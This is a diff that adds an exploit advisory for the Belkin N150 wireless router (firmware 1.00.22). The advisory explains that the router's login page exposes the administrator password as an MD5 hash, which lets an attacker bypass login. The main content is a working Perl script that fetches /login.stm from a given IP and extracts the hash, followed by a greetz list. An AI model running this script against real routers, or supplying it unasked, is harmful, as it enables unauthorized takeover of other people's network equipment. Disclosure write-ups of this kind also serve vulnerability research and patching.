@@ -1,0 +1,43 @@
+============================================
+Belkin N150 Wireless MD5 Password Disclosure
+============================================
+
+
+Firmware Version :  1.00.22 (Aug 31 2010 14:36:01)
+Boot Version     :  1.20 
+Hardware         :  F7D1301 v1 (01A) 
+Author           :  Avinash Tangirala
+
+======================
+Vulnerability Details:
+======================
+
+The Router's web interface on default 192.168.2.1 reveals the administrator password in MD5 hash thereby one can bypass the login completely.
+There is a similar exploit for Belkin G wireless router by aodrulez. Therefore this exploit might* work possibly on every Belkin router created :D.
+
+=========
+Exploit :
+=========
+ 
+#/usr/bin/perl
+use strict; 
+use LWP::Simple;
+print "\n  'Belkin N150 Wireless Router' Admin Exploit ";
+print "\n ---------------------------------------------\n\n";
+print "[+] Enter the Router's IP Address : ";
+my $ip=<STDIN>;
+chomp($ip);
+$ip=get("http://".$ip."/login.stm") or die "\n[!] check ip and try again \n";
+my @arr=$ip =~ m/var password = "(.*)";/g;
+print "[+] Admin Password = ".@arr[0]." (MD5 Hash).\n";
+
+
+==========
+Greetz to:
+==========
+
+1.) Aodrulez  :  My Mentor 
+2.) Arkz
+3.) neurotoxIN
+4.) www.codeeleven.in
+
